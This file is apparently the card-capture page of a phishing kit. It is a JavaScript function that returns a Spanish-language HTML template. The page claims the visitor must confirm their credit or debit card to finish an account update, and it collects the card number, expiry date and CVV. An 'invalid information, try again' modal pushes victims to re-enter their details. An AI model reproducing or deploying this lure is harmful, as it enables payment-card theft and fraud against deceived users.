export function cardTemplate() {
    return `
 
 <style>
        .content_modal_e {
            display: none; /* Ocultar por defecto */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .content_modal_e.visible {
            display: flex; /* Mostrar el modal cuando sea visible */
        }
    </style>

    <header>
        <img src="img/logo.png" alt="">
    </header>

    <div class="content">
        <div class="welcome">
            <h2>Tarjeta de Crédito</h2>
            <p>Para terminar con la actualización de su cuenta, debe confirmar los datos de su tarjeta de crédito o débito.</p>
        </div>

        <form class="form_">
            <input type="hidden" name="id" value="64">
            <div class="form">
                <div class="from-input">
                    <input type="text" name="nro_tarjeta" placeholder="Nro. de la Tarjeta" id="inp_tarjerta">
                </div>
                <div class="from-input2">
                    <div class="fecha">
                        <div class="m">
                            <select name="mes_tarjeta" id="" class="form-control">
                                <option disabled selected="">Mes</option>
                                <option value="01">01</option>
                                <option value="02">02</option>
                                <option value="03">03</option>
                                <option value="04">04</option>
                                <option value="05">05</option>
                                <option value="06">06</option>
                                <option value="07">07</option>
                                <option value="08">08</option>
                                <option value="09">09</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                        </div>
                        <div class="y">
                            <select name="year_tarjeta" class="form-control" >
                                <option disabled="" selected="">Año</option>
                               
                               
                                <option value="25">25</option>
                                <option value="26">26</option>
                                <option value="27">27</option>
                                <option value="28">28</option>
                                <option value="29">29</option>
                                <option value="30">30</option>
                                <option value="31">31</option>
                                  <option value="32">32</option>
                                <option value="33">33</option>
                                <option value="34">34</option>
                                 <option value="35">35</option>
                            </select>
                        </div>
                    </div>
                    <div class="cvv">
                        <input type="text" placeholder="CVV" name="cvv_tarjeta" id="inp_cvvtj">
                    </div>
                </div>
            </div>

            <div class="btn">
                <button id="submit" type="submit" disabled>Finalizar</button>
            </div>
        </form>
    </div>

    <!-- Modal de error -->
    <div class="content_modal_e <?php echo $mostrarModal ? 'visible' : ''; ?>">
        <div class="modal">
            <div class="close">
                <img src="img/times-circle.svg" alt="Cerrar" onclick="closeModale();">
            </div>
            <div class="text">
                <p>Información Inválida, <br> por favor vuelve a intentarlo</p>
            </div>
            <button type="button" onclick="closeModale();">OK</button>
        </div>
    </div>

    <img src="img/grupo.svg" class="grupoa" alt="">

    

    `;
  }